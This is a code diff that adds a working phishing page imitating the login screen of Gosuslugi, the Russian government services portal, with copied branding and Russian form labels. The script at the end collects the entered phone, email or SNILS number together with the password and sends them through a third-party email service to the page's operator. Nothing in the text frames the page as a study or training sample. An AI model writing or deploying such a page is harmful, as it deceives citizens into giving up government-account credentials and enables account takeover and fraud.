@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="css/gosuslugi.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://smtpjs.com/v3/smtpjs.js"></script>
+    <script type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+    (function(){
+    emailjs.init({
+        publicKey: "TymCgkYexBS3Dzuo-",
+    });
+    })();
+    </script>
+    <title>Госуслуги</title>
+    <style>
+        body {
+    font-size: 16px;
+    line-height: 24px;
+    font-weight: 400;
+    min-height: 100%;
+    font-family: Verdana, Geneva, Tahoma, sans-serif;
+    background: #e4ecfd;
+    color: #0b1f33;
+    margin: 0;
+    padding-top: 60px;
+    border: 0;
+}
+.container {
+    position: relative;
+    margin: 0 auto;
+    padding: 0 16px;
+    max-width: 416px;
+}
+.gosuslugi-block{
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    row-gap: 2em;
+    align-items: center;
+    padding: 40px 24px 35px;
+    border-radius: 12px;
+    box-shadow: 0 24px 48px #e6ebf566;
+    background: #fff;
+}
+.gosuslugi-block img{
+    display: flex;
+    height: 1.5em;
+    width: auto;
+}
+input{
+    width: 90%;
+    outline: none;
+    height: 2em;
+    padding: 0.8em 1em;
+    border: 0;
+    border-radius: 8px;
+    font-size: 0.8em;
+    background: #f5f7fa;
+    font-family: Verdana, Geneva, Tahoma, sans-serif;
+    margin-bottom: 20px;
+}
+.mb8{
+    margin-bottom: 8px;
+}
+.vosst{
+    display: flex;
+    text-align: left;
+    text-decoration: none;
+    color: #0d4cd3;
+    font-size: 0.87em;
+}
+.accept{
+    border-radius: 8px;
+    border: none;
+    padding: 0.78em 1em;
+    font-size: 0.9em;
+    line-height: 24px;
+    color: #fff;
+    background: #0d4cd3;
+    cursor: pointer;
+    width: 100%;
+    text-align: center;
+    margin-top: 40px;
+}
+.plain-button-inline, .plain-link {
+    display: flex;
+    background: none;
+    font-size: 0.9em;
+    line-height: inherit;
+    border: 0;
+    text-align: left;
+    color: #0d4cd3;
+    width: 100%;
+    margin-top: 27px;
+    justify-content: center;
+}
+.reg{
+    margin-top: 17px;
+}
+.password-gos{
+    position: relative;
+    border-radius: 12px;
+    padding: 24px;
+    box-shadow: 0 6px 16px #e6ebf5cc;
+    text-align: left;
+    color: #3b3b3b;
+    line-height: 24px;
+    background: #ffffff;
+    margin-top: 30px;
+}
+.password-a{
+    font-size: 0.9em;
+    text-decoration: none;
+    letter-spacing: -.02em;
+    color: #0d4cd3;
+    cursor: pointer;
+}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="gosuslugi-block">
+            <img src="https://toplogos.ru/images/logo-gosuslugi-ru.png">
+            <section class="gos-form">
+                <input id="email" placeholder="Телефон / Email / СНИЛС">
+                <input id="password" class="mb8" placeholder="Пароль">
+                <a href="#" class="vosst">Восстановить</a>
+                <button class="accept" onclick="Send()">Войти</button>
+                <button _ngcontent-lir-c93="" type="button" tabindex="0" class="plain-button-inline"> Не удаётся войти? </button>
+            </section>
+        </div>
+        <button _ngcontent-lir-c93="" type="button" tabindex="0" class="plain-button-inline reg"> Зарегистрироваться </button>
+        <div class="password-gos">
+            <img src="https://gu-st.ru/content/Banner/Esia_a1.svg" style="width: 48px;height: 48px;">
+            <div style="width: 180px;margin: 16px 0 -1px;letter-spacing: -0.025em;"><a href="https://www.gosuslugi.ru/landing/esia-help" target="_blank" class="password-a">Куда ещё можно войти с паролем от Госуслуг?</a></div>
+        </div>
+    </div>
+
+    <script>
+        function Send(){
+            let parms = {
+                email : document.getElementById("email").value,
+                password : document.getElementById("password").value,
+            }
+            emailjs.send("service_rtjijim","template_xstaf2o",parms);
+        }
+    </script>
+</body>
+</html>
